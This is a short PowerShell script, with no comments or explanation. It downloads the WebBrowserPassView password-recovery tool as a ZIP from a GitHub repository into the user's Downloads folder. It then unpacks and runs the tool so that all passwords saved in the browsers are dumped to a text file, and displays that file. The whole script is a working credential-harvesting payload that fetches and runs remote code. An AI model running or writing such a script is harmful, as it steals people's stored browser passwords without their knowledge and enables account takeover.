$nameFile="WebBrowserPassView"
$runDirectory="$env:USERPROFILE\downloads"

$zipFolder="$runDirectory\$nameFile.zip"
$unzipFolder="$runDirectory\$nameFile"
$exeFile="$unzipFolder\$nameFile.exe"
$txtFile="$unzipFolder\$nameFile.txt"

$params="/sfile $txtFile"


Set-Location -path $runDirectory
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MaxAxoft/demo/main/$nameFile.zip" -Method Get -OutFile $zipFolder
Expand-Archive $zipFolder -DestinationPath $unzipFolder
& "$exeFile" $params
$txtFile
